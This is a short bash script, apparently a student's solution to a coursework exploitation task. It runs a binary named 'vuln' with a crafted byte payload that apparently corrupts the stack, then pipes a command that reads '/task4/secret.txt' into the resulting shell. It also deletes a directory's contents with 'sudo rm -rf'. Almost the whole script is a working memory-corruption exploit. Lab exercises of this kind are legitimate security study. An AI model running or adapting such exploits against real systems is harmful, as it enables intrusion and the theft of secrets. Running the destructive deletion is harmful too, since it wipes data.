#!/usr/bin/env bash
echo "Starting script" 
echo "Cleaning working environment\n Enter 'student' for sudo access "
sudo rm -rf /task4/*
ebp="\x8f\xd8\xf5"
echo /bin/cat /task4/secret.txt | env -i SHELL=/bin/sh \
  /task4/s1851664/vuln "$(python -c "print('$ebp\x01\x8f\xd8\xf5\xf7')")" 123